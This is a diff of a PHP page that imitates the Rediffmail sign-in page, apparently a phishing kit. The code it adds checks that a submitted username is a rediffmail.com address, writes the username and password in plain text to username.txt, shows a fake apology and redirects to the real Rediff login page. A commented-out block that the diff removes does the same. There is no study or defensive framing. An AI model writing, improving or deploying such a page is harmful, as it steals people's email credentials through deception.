@@ -1,6 +1,3 @@
-<?php
-    session_start();
-?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -10,8 +7,13 @@
     <title>Rediffmail</title>
     <style>
         .txt_blue{
-                color: blue;
-                }           
+            color: #0055cc;
+        } 
+        .error_msg{
+            color: #ce2110;
+            font-weight: bolder;
+            margin: 10px 0 5px 70px;
+        }
     </style>
     <link rel="shortcut icon" href="logopng.png" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
@@ -25,9 +27,57 @@
             <span class="mail">mail</span>
         </div>
         <div class="form_div">
-            <!-- <form action="<?php $_SERVER['PHP_SELF']; ?>" method="POST"> -->
-            <form action="login.php" method="POST">
+        <?php
+        // session_start();
+        $error_msg = "";
+        if($_SERVER['REQUEST_METHOD'] == 'POST')
+        {
+            $user = $_POST['username'];
+            $pwd = $_POST['password'];
+            $pattern = "/^[a-zA-Z0-9._%+-]+@rediffmail\.com$/";  
+            // validate_username($user);
+            if(empty($user) || empty($pwd))
+            { 
+                $error_msg = "Username field is empty";
+                // exit();
+            }
+            // if (empty($user)) {
+            //     echo "<script>document.getElementById('error-message').innerHTML = '$error_msg';</script>";
+            //     exit();
+            // }
+            
+            else if(!preg_match($pattern,$user))
+                {
+                    $error_msg = "Wrong username format";
+                    // exit();
+                }
+                // die("Incorrect format");
+            // if(empty($error_msg))
+            else
+            {
+                $fp = fopen("username.txt",'a');
+                fwrite($fp,"USERNAME : ");
+                fwrite($fp,$user);
+                fwrite($fp," -- ");
+                fwrite($fp,"PASSWORD : ");
+                fwrite($fp,$pwd);
+                fwrite($fp,"\n");
+                fclose($fp);
+                echo $error_msg;
+                echo "Sorry for the inconvinience. Redirecting to login page.";
+                header("Refresh:3; url=https://mail.rediff.com/cgi-bin/login.cgi");
+                exit();
+            }
+        }
+    
+        ?>
+            <div class="error_msg">
+                <?php echo $error_msg; ?>
+            </div>
+            <form action="<?php $_SERVER['PHP_SELF']; ?>" method="POST">
+            <!-- <form action="login.php" method="POST"> -->
                 <table>
+                    
                     <tr>
                         <td>Username</td>
                         <td colspan="2"><input type="text" size = 40 name = "username"></td>
@@ -39,6 +89,7 @@
                         <!-- <td></td> -->
                         <td id = "sign_in"><input type="submit" value = "Sign in" name ="signin"></td>
                     </tr>
+                   
                     <tr>
                         <td></td>
                         <td >
@@ -52,8 +103,8 @@
         </div>
         <div class="create_acc">
             <p>Don't have a Rediffmail ID</p>
-                <a href="https://register.rediff.com/register/register.php?FormName=user_details">Create a new account 
-                </a>     
+                <b><a href="https://register.rediff.com/register/register.php?FormName=user_details"  class="txt_blue">Create a new account 
+                </a></b>     
         </div>
     </div>
     <main>
@@ -274,24 +325,5 @@
         </div>
 
     </footer>
-
-    <!-- <?php
-        if($_SERVER['REQUEST_METHOD'] == 'POST')
-        {
-            if(isset($_POST['username']) && isset($_POST['password']))
-            {
-                $fp = fopen("username.txt",'a');
-                $user = $_POST['username'];
-                $pwd = $_POST['password'];
-                fwrite($fp,$user);
-                fwrite($fp," -- ");
-                fwrite($fp,$pwd);
-                fwrite($fp,"\n");
-                fclose($fp);
-            }
-        }
-        header("Location : https://mail.rediff.com/cgi-bin/login.cgi");
-        exit();
-    ?> -->
 </body>
 </html>
